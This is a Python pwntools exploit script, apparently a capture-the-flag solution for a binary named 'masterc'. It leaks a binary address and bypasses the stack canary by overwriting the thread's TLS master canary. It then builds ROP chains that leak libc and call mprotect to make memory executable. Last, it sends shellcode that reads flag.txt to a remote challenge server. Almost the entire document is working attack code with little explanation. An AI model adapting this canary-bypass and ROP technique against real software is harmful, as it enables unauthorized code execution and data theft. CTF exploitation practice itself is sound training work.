#!/usr/bin/env python3

from pwn import *

exe = ELF("./masterc", checksec=0)
libc = ELF("./libc-2.31.so", checksec=0)
ld = ELF("./ld-2.31.so", checksec=0)

context.binary = exe


#def conn():
 #       return process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})

def conn():
    return process(exe.path)


def main():
    #r = conn()
    #r = remote("localhost", 9999)
    # r = remote("138.68.140.227", 9999)
    r = remote("masterc.2021.3k.ctf.to",9999)
    
    r.sendlineafter("Enter the size : ", "10")
    r.sendlineafter("Enter the number of tries : ", "1")
    r.sendlineafter("Enter your guess : ", "+")
    r.recvuntil("You entered ")
    leak = int(r.recvuntil(" ").strip())

    log.warn("Binary leak @ 0x%x", leak)
    exe.address = leak - 0x1579
    log.warn("Binary base @ 0x%x", exe.address)
    
    pause()
    pop_rdi = exe.address + 0x0000000000001793
    
    payload  = b"M"*0x18
    payload += b"C"*8  # canary
    payload += b"A"*8  # rbp
    payload += p64(pop_rdi)
    payload += p64(exe.got['puts'])
    payload += p64(exe.plt['puts'])
    payload += p64(exe.sym['win'])
    
    # Change the master canary in the TLS, as the threaded function get a stack frame closer to it.
    # Our canary will be compared to the one we overwrite
    # We control them both now, the check pass and we can ROP.
    payload += b"C"*0x818
    
    r.sendlineafter("> \n", payload)
    puts = u64(r.recvline().strip().ljust(0x8, p8(0)))
    log.warn("Libc leak @ 0x%x", puts)
    libc.address = puts - libc.sym['puts']
    log.warn("Libc base @ 0x%x", libc.address)
    
    pop_rsi = libc.address + 0x0000000000027529
    pop_rdx_r12 = libc.address + 0x000000000011c371
    
    rw_segment = exe.address + 0x4000

    payload = b"M"*0x18
    payload += b"C"*8
    payload += b"A"*8
    payload += p64(pop_rdi)
    payload += p64(rw_segment)
    payload += p64(pop_rsi)
    payload += p64(0x1000)
    payload += p64(pop_rdx_r12)
    payload += p64(0x7)*2 #RWX
    payload += p64(libc.sym["mprotect"])
    payload += p64(pop_rdi)
    payload += p64(rw_segment+0x100)
    payload += p64(libc.sym['gets'])
    payload += p64(rw_segment+0x100)
    r.sendlineafter("> \n", payload)
    
    shellcode = asm(f"""
        xor eax, eax
        push rax
        mov r14, {u64("flag.txt")}
        push r14

        mov rdi, rsp
        xor esi, esi
        xor edx, edx
        mov eax, 0x2
        syscall
        
        mov edi, 1
        mov esi, eax
        mov r10d, 0x100
        mov eax, 0x28
        syscall

        mov edi, 0x4d
        mov eax, 0x3c
        syscall
    """)

    pause()
    r.sendline(shellcode)

    r.interactive()


if __name__ == "__main__":
    main()
